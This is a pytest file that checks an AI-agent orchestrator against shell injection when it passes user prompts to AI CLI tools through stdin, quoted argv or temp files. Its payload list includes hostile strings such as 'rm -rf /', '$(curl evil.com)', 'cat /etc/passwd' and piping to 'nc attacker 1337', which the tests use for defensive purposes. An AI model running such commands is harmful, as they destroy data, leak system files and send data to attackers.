"""Shell-injection invariant tests for AI tool invocation.

Threat model: user-supplied task / prompt text is fed to AI CLI tools
spawned by OWT. If that text is interpolated into a shell command string
without quoting, shell metacharacters become command injection.

Invariant under test: user prompt text reaches the AI tool as either a
single argv element (post shlex.split) or as a stdin payload — never as
multiple argv slots, never as argv[0], never concatenated into a shell
command line that the OS parses.

See docs/security.md for the full threat model.
"""

from __future__ import annotations

import shlex
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest

from open_orchestrator.core.agent_launcher import AgentLauncher, LaunchMode, LaunchRequest
from open_orchestrator.core.tool_registry import (
    ClaudeTool,
    CustomTool,
    DroidTool,
    OpenCodeTool,
    PiTool,
)

# Payloads that would execute attacker code if the prompt were ever parsed
# by a POSIX shell. Each must remain inert (one argv element / stdin only).
MALICIOUS_PROMPTS: list[str] = [
    '"; rm -rf / #',
    "$(curl evil.com)",
    "`whoami`",
    "$IFS;cat /etc/passwd",
    "foo && touch /tmp/pwned",
    "foo | nc attacker 1337",
    "'; DROP TABLE users; --",
]

# ─── Layer 1: registry get_command never embeds the raw prompt ─────────

BUILT_IN_TOOLS = [ClaudeTool(), PiTool(), DroidTool(), OpenCodeTool()]


@pytest.mark.parametrize("tool", BUILT_IN_TOOLS, ids=lambda t: t.name)
@pytest.mark.parametrize("payload", MALICIOUS_PROMPTS)
def test_builtin_tool_command_excludes_prompt(tool, payload: str) -> None:
    """Built-in tools deliver the prompt via stdin, so the prompt must not
    appear in the command string at all — neither raw nor shell-quoted."""
    cmd = tool.get_command(executable_path=None, plan_mode=False, prompt=payload)
    assert payload not in cmd, f"{tool.name}.get_command leaked prompt into the command string: {cmd!r}"
    quoted = shlex.quote(payload)
    assert quoted not in cmd, (
        f"{tool.name}.get_command embedded the prompt (quoted) — built-ins must pipe via stdin only. Got: {cmd!r}"
    )


@pytest.mark.parametrize("payload", MALICIOUS_PROMPTS)
def test_custom_tool_command_quotes_prompt_as_single_argv(payload: str) -> None:
    """CustomTool with prompt_flag embeds the prompt — must use shlex.quote
    so shlex.split (or a POSIX shell) recovers exactly one argv element."""
    tool = CustomTool(
        name="mytool",
        binary="mytool",
        command_template="{binary} run",
        prompt_flag="--prompt",
    )
    cmd = tool.get_command(executable_path=None, plan_mode=False, prompt=payload)
    argv = shlex.split(cmd)

    # The argv must contain exactly one element equal to the payload, and
    # it must follow the prompt flag (i.e. be a value, not the binary).
    assert argv[0] == "mytool", f"prompt corrupted argv[0]: {argv!r}"
    assert "--prompt" in argv, f"prompt flag missing from argv: {argv!r}"
    prompt_index = argv.index("--prompt") + 1
    assert prompt_index < len(argv), f"prompt missing after flag: {argv!r}"
    assert argv[prompt_index] == payload, (
        f"prompt did not round-trip as a single argv element. "
        f"Expected {payload!r}, got {argv[prompt_index]!r}. Full argv: {argv!r}"
    )

    # And the payload must not appear in any other argv slot (no splitting).
    other_slots = [a for i, a in enumerate(argv) if i != prompt_index]
    for slot in other_slots:
        assert payload not in slot, f"Prompt fragment leaked into argv[{argv.index(slot)}]={slot!r} of {argv!r}"


# ─── Layer 2: AgentLauncher headless path passes prompt via stdin only ─


class _FakeTool:
    name = "claude"
    binary = "claude"
    supports_hooks = True
    supports_headless = True
    supports_plan_mode = True
    task_via_args = False
    install_hint = ""

    def get_command(
        self,
        *,
        executable_path: str | None = None,
        plan_mode: bool = False,
        prompt: str | None = None,
        worktree: str | None = None,
    ) -> str:
        # Mirror the real built-in contract: no prompt in the command line.
        binary = shlex.quote(executable_path) if executable_path else self.binary
        parts = [binary, "--dangerously-skip-permissions"]
        if prompt:
            parts.append("-p")
        return " ".join(parts)

    def is_installed(self) -> bool:
        return True

    def get_known_paths(self) -> list[Path]:
        return [Path("/usr/bin/claude")]

    def install_hooks(self, worktree_path, worktree_name, db_path=None) -> bool:
        return True


def _make_launcher(tmp_path: Path) -> tuple[AgentLauncher, SimpleNamespace]:
    worktree = SimpleNamespace(name="wt", path=tmp_path, branch="feat/wt")
    wt_manager = MagicMock()
    wt_manager.list_all.return_value = []
    wt_manager.create.return_value = worktree
    wt_manager.git_root = tmp_path

    tmux = MagicMock()

    tracker = MagicMock()
    tracker.storage_path = str(tmp_path / "status.db")

    launcher = AgentLauncher(
        repo_path=str(tmp_path),
        wt_manager=wt_manager,
        tmux=tmux,
        status_tracker=tracker,
        config=SimpleNamespace(
            environment=SimpleNamespace(auto_install_deps=False, copy_env_file=False),
            recall_enabled=False,
        ),
    )
    return launcher, worktree


@pytest.mark.parametrize("payload", MALICIOUS_PROMPTS)
def test_headless_launch_isolates_prompt_to_stdin(tmp_path: Path, payload: str) -> None:
    """`_launch_headless_by_path` must:
    1. Build argv from the command string with shlex.split — no shell=True.
    2. Never put the prompt in any argv slot.
    3. Write the prompt to proc.stdin verbatim.
    """
    launcher, _ = _make_launcher(tmp_path)
    fake_tool = _FakeTool()
    tracker = MagicMock()

    captured: dict[str, object] = {}

    class _FakeProc:
        pid = 4242

        def __init__(self) -> None:
            self.stdin = MagicMock()

    fake_proc = _FakeProc()

    def _record_popen(argv, **kwargs):
        captured["argv"] = list(argv)
        captured["kwargs"] = kwargs
        # The launcher MUST NOT use shell=True.
        assert kwargs.get("shell", False) is False, "Headless launch used shell=True — shell injection risk"
        return fake_proc

    request = LaunchRequest(
        branch="feat/x",
        base_branch=None,
        ai_tool="claude",
        mode=LaunchMode.HEADLESS,
        prompt=payload,
    )

    with (
        patch("open_orchestrator.core.agent_launcher.try_resolve_binary", return_value="/usr/bin/claude"),
        patch("open_orchestrator.core.agent_launcher.subprocess.Popen", side_effect=_record_popen),
    ):
        launcher._launch_headless_by_path(
            session_path=str(tmp_path),
            tool=fake_tool,
            request=request,
            tracker=tracker,
        )

    argv = captured["argv"]
    assert isinstance(argv, list), f"argv must be a list, got {type(argv).__name__}"

    # Invariant 1: the malicious payload must not appear in any argv slot.
    for i, slot in enumerate(argv):
        assert payload not in slot, f"Payload {payload!r} leaked into argv[{i}]={slot!r}. Full argv: {argv!r}"

    # Invariant 2: argv[0] must be the binary, never the payload.
    assert argv[0] == "/usr/bin/claude", f"argv[0] corrupted: {argv!r}"

    # Invariant 3: the prompt must have been written to stdin verbatim.
    fake_proc.stdin.write.assert_called_once_with(payload.encode())
    fake_proc.stdin.close.assert_called_once()


# ─── Layer 3: tmux pane prompt-file path keeps prompt in file, not in cmd ─


@pytest.mark.parametrize("ai_tool", ["claude", "pi"])
@pytest.mark.parametrize("payload", MALICIOUS_PROMPTS)
def test_tmux_prompt_file_path_excludes_payload(tmp_path: Path, ai_tool: str, payload: str) -> None:
    """`_start_tool_in_pane` writes the prompt to a temp file and pipes via
    `cat <quoted-path> | tool`. The pasted shell line MUST NOT contain the
    payload — only the file path."""
    from open_orchestrator.core.tmux_manager import TmuxManager

    tmux = TmuxManager.__new__(TmuxManager)  # bypass __init__
    tmux._server = None  # avoid __del__ AttributeError noise

    captured: dict[str, object] = {}

    fake_pane = MagicMock()
    fake_pane.session.name = "owt-wt"
    fake_pane.window.index = 0
    fake_pane.pane_index = 0

    def _capture_send(cls, pane, command):
        captured["command"] = command

    from open_orchestrator.core.tool_registry import get_registry

    real_tool = get_registry().get(ai_tool)
    assert real_tool is not None, f"tool '{ai_tool}' not registered"

    with (
        patch.object(TmuxManager, "_wait_for_shell_ready", lambda self, pane: None),
        patch.object(
            TmuxManager,
            "_send_command_to_pane",
            classmethod(_capture_send),
        ),
        patch.object(TmuxManager, "_resolve_executable", lambda self, tool: f"/usr/bin/{tool.binary}"),
        patch.object(real_tool, "is_installed", lambda: True),
    ):
        tmux._start_ai_tool_in_pane(
            pane=fake_pane,
            ai_tool=ai_tool,
            plan_mode=False,
            auto_exit=False,
            automated=False,
            prompt=payload,
        )

    command = captured["command"]
    assert isinstance(command, str)

    # Invariant: the payload never appears in the shell command line — it
    # lives in a temp file referenced by path.
    assert payload not in command, f"Payload {payload!r} leaked into the pane shell command: {command!r}"

    # Sanity: the path token in the command must point at an owt-prompt file
    # (i.e. the prompt really did get written to disk rather than inlined).
    assert "owt-prompt-" in command, f"Expected an owt-prompt temp-file reference in command, got: {command!r}"

    # And the file's contents must equal the payload verbatim.
    tokens = shlex.split(command)
    # find the token that is an absolute path to an owt-prompt file
    prompt_paths = [t for t in tokens if "owt-prompt-" in t]
    assert prompt_paths, f"No prompt file path found in tokens: {tokens!r}"
    prompt_path = Path(prompt_paths[0])
    try:
        assert prompt_path.read_text() == payload, "Prompt file contents do not match the payload verbatim"
    finally:
        prompt_path.unlink(missing_ok=True)


# ─── Layer 4: no shell=True anywhere in the core invocation path ───────


def test_no_shell_true_in_core() -> None:
    """Hard gate: `shell=True` must not appear in any core/ module. If this
    test fails, a new invocation site introduced shell injection risk."""
    import re

    core_dir = Path(__file__).parent.parent / "src" / "open_orchestrator" / "core"
    offenders: list[str] = []
    pattern = re.compile(r"shell\s*=\s*True")
    for py in core_dir.rglob("*.py"):
        for lineno, line in enumerate(py.read_text().splitlines(), start=1):
            # Allow the convention of mentioning shell=True in a comment.
            code = line.split("#", 1)[0]
            if pattern.search(code):
                offenders.append(f"{py.relative_to(core_dir.parent.parent.parent)}:{lineno}: {line}")
    assert not offenders, "shell=True found in core/:\n" + "\n".join(offenders)
